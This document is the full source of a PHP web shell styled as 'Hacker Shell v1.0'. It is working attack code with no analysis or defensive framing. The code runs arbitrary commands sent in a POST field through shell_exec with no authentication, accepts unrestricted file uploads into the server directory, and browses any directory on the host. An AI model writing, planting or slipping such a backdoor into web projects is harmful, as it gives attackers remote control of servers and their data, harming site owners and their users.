<?php
error_reporting(0); // Suppress errors for cleaner output

// Command Execution
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = shell_exec($command . " 2>&1");
    $cmd_result = htmlspecialchars($output);
}

// File Upload
if (isset($_FILES['upload_file'])) {
    $upload_dir = getcwd() . "/";
    $upload_file = $upload_dir . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $upload_file)) {
        $upload_result = "UPLOAD SUCCESS: " . htmlspecialchars(basename($upload_file));
    } else {
        $upload_result = "UPLOAD FAILED!";
    }
}

// Directory Traversal
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!is_dir($dir)) $dir = getcwd(); // Fallback to current dir if invalid
$files = scandir($dir);
$file_list = "";
$parent_dir = dirname($dir); // For "Back" option
foreach ($files as $file) {
    if ($file != "." && $file != "..") {
        $full_path = $dir . "/" . $file;
        $file_list .= "<li><a href='?dir=" . urlencode($full_path) . "' class='file-link'>" . htmlspecialchars($file) . "</a> (" . (is_dir($full_path) ? "DIR" : "FILE") . ")</li>";
    }
}
?>

<html>
<head>
    <title>Hacker Shell v1.0</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            margin: 20px;
        }
        h2, h3 { color: #0f0; text-shadow: 0 0 5px #0f0; }
        pre { background: #111; padding: 10px; border: 1px solid #0f0; }
        input[type="text"], input[type="file"] {
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 5px;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"] {
            background: #0f0;
            color: #000;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"]:hover { background: #0a0; }
        ul { list-style-type: none; padding: 0; }
        .file-link { color: #0f0; text-decoration: none; }
        .file-link:hover { text-decoration: underline; text-shadow: 0 0 5px #0f0; }
        .back-link { color: #f00; font-weight: bold; }
        .terminal-output { white-space: pre-wrap; }
    </style>
    <script>
        // Typewriter effect for command output
        function typeWriter(text, elementId, speed = 50) {
            let i = 0;
            const element = document.getElementById(elementId);
            element.innerHTML = "";
            function type() {
                if (i < text.length) {
                    element.innerHTML += text.charAt(i);
                    i++;
                    setTimeout(type, speed);
                }
            }
            type();
        }

        // Trigger typewriter on page load if there's output
        window.onload = function() {
            <?php if (isset($cmd_result)) { ?>
                typeWriter(<?php echo json_encode($cmd_result); ?>, 'cmd-output');
            <?php } ?>
            <?php if (isset($upload_result)) { ?>
                typeWriter(<?php echo json_encode($upload_result); ?>, 'upload-output');
            <?php } ?>
        };
    </script>
</head>
<body>
    <h2>[- HACKER SHELL v1.0 -]</h2>

    <!-- Command Execution -->
    <h3>TERMINAL ACCESS</h3>
    <form method="POST">
        <input type="text" name="cmd" placeholder="> whoami" style="width: 300px;">
        <input type="submit" value="EXECUTE">
    </form>
    <?php if (isset($cmd_result)) { ?>
        <pre><span id="cmd-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- File Upload -->
    <h3>FILE INFILTRATION</h3>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="upload_file">
        <input type="submit" value="INFILTRATE">
    </form>
    <?php if (isset($upload_result)) { ?>
        <pre><span id="upload-output" class="terminal-output"></span></pre>
    <?php } ?>

    <!-- File Browser -->
    <h3>SYSTEM EXPLORATION</h3>
    <p>CURRENT SECTOR: <?php echo htmlspecialchars($dir); ?></p>
    <p><a href="?dir=<?php echo urlencode($parent_dir); ?>" class="back-link">[BACK]</a></p>
    <ul>
        <?php echo $file_list; ?>
    </ul>
</body>
</html>
